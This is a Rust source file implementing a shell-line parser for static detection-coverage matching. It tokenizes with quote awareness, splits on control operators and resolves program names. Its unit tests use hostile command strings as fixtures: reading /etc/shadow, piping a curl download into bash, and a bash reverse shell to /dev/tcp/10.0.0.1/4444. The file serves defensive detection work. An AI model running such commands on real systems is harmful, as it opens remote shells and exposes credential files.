//! A pragmatic shell-line parser. It is deliberately not a full POSIX shell
//! grammar: it tokenizes with quote awareness, strips comments, splits a line
//! into command segments on the common control operators, and resolves each
//! segment to a program basename plus arguments (stripping wrappers like
//! `sudo`/`env` and `VAR=value` assignments). Good enough to drive static
//! detection-coverage matching; the raw line is always preserved so that
//! substring-based rules (redirections, pipe-to-shell, sensitive paths) still
//! match regardless of tokenization edge cases.

/// A resolved command: the program invoked and its arguments, plus the raw
/// text of the line it came from.
#[derive(Debug, Clone)]
pub struct Command {
    pub program: String,
    pub args: Vec<String>,
    pub raw: String,
}

impl Command {
    /// Arguments joined with spaces, lowercased — used for `args_contains`.
    pub fn args_joined(&self) -> String {
        self.args.join(" ").to_lowercase()
    }
}

/// Wrapper programs whose presence at the head of a segment should be skipped
/// to reach the "real" command underneath.
const WRAPPERS: &[&str] = &[
    "sudo", "env", "nohup", "time", "command", "exec", "builtin", "doas", "setsid", "stdbuf",
    "nice", "ionice", "unbuffer",
];

/// Tokens that separate one command from the next within a line.
const SEPARATORS: &[&str] = &[";", "|", "||", "&&", "&"];

/// Tokenize a single line with quote awareness, returning bare tokens (quote
/// characters removed). Comments (`#` beginning a word) terminate the line.
fn tokenize(line: &str) -> Vec<String> {
    let mut tokens = Vec::new();
    let mut cur = String::new();
    let mut in_single = false;
    let mut in_double = false;
    let mut prev_was_space = true; // start-of-line counts as space for `#`

    let mut chars = line.chars().peekable();
    while let Some(c) = chars.next() {
        match c {
            '\'' if !in_double => {
                in_single = !in_single;
                prev_was_space = false;
            }
            '"' if !in_single => {
                in_double = !in_double;
                prev_was_space = false;
            }
            '#' if !in_single && !in_double && prev_was_space => {
                break; // start of a comment
            }
            c if c.is_whitespace() && !in_single && !in_double => {
                if !cur.is_empty() {
                    tokens.push(std::mem::take(&mut cur));
                }
                prev_was_space = true;
            }
            // Control operators break the current token even without
            // surrounding whitespace (e.g. `id;curl` or `a|b`). `||`/`&&` are
            // emitted as a single separator token.
            ';' | '|' | '&' if !in_single && !in_double => {
                if !cur.is_empty() {
                    tokens.push(std::mem::take(&mut cur));
                }
                let op = if (c == '|' || c == '&') && chars.peek() == Some(&c) {
                    chars.next();
                    format!("{c}{c}")
                } else {
                    c.to_string()
                };
                tokens.push(op);
                prev_was_space = true;
            }
            c => {
                cur.push(c);
                prev_was_space = false;
            }
        }
    }
    if !cur.is_empty() {
        tokens.push(cur);
    }
    tokens
}

fn is_assignment(tok: &str) -> bool {
    // NAME=value with a valid shell identifier before '='.
    if let Some(eq) = tok.find('=') {
        if eq == 0 {
            return false;
        }
        let name = &tok[..eq];
        let mut chars = name.chars();
        let first_ok = chars
            .next()
            .map(|c| c.is_ascii_alphabetic() || c == '_')
            .unwrap_or(false);
        return first_ok && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_');
    }
    false
}

fn basename(program: &str) -> String {
    let trimmed = program.strip_prefix("./").unwrap_or(program);
    trimmed.rsplit('/').next().unwrap_or(trimmed).to_string()
}

/// Resolve one segment's tokens into a [`Command`], skipping leading
/// assignments and wrapper programs. Returns `None` for an empty segment.
fn to_command(tokens: &[String], raw: &str) -> Option<Command> {
    let mut i = 0;
    while i < tokens.len() {
        let tok = &tokens[i];
        if is_assignment(tok) {
            i += 1;
            continue;
        }
        if WRAPPERS.contains(&tok.to_lowercase().as_str()) {
            i += 1;
            // Skip option flags belonging to the wrapper (best-effort).
            while i < tokens.len() && tokens[i].starts_with('-') {
                i += 1;
            }
            continue;
        }
        break;
    }
    let program_tok = tokens.get(i)?;
    let program = basename(program_tok);
    let args = tokens.get(i + 1..).unwrap_or(&[]).to_vec();
    Some(Command {
        program,
        args,
        raw: raw.to_string(),
    })
}

/// Parse a single source line into zero or more commands. Each command carries
/// the full raw line so that substring rules remain line-scoped.
pub fn parse_line(line: &str) -> Vec<Command> {
    let raw = line.trim().to_string();
    let tokens = tokenize(line);
    if tokens.is_empty() {
        return Vec::new();
    }

    let mut commands = Vec::new();
    let mut segment: Vec<String> = Vec::new();
    for tok in tokens {
        if SEPARATORS.contains(&tok.as_str()) {
            if let Some(cmd) = to_command(&segment, &raw) {
                commands.push(cmd);
            }
            segment.clear();
        } else {
            segment.push(tok);
        }
    }
    if let Some(cmd) = to_command(&segment, &raw) {
        commands.push(cmd);
    }
    commands
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn strips_sudo_and_assignments() {
        let cmds = parse_line("FOO=bar sudo cat /etc/shadow");
        assert_eq!(cmds.len(), 1);
        assert_eq!(cmds[0].program, "cat");
        assert_eq!(cmds[0].args, vec!["/etc/shadow"]);
    }

    #[test]
    fn splits_on_pipe_and_semicolon() {
        let cmds = parse_line("id; curl http://x/y | bash");
        let progs: Vec<_> = cmds.iter().map(|c| c.program.as_str()).collect();
        assert_eq!(progs, vec!["id", "curl", "bash"]);
    }

    #[test]
    fn comment_is_ignored() {
        let cmds = parse_line("whoami # who am I");
        assert_eq!(cmds.len(), 1);
        assert_eq!(cmds[0].program, "whoami");
    }

    #[test]
    fn hash_inside_quotes_is_kept() {
        let cmds = parse_line("echo '# not a comment'");
        assert_eq!(cmds[0].program, "echo");
        assert_eq!(cmds[0].args, vec!["# not a comment"]);
    }

    #[test]
    fn basename_resolves_path() {
        let cmds = parse_line("/usr/bin/whoami");
        assert_eq!(cmds[0].program, "whoami");
    }

    #[test]
    fn raw_is_preserved_for_redirect() {
        let cmds = parse_line("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1");
        assert!(cmds[0].raw.contains("/dev/tcp"));
    }
}
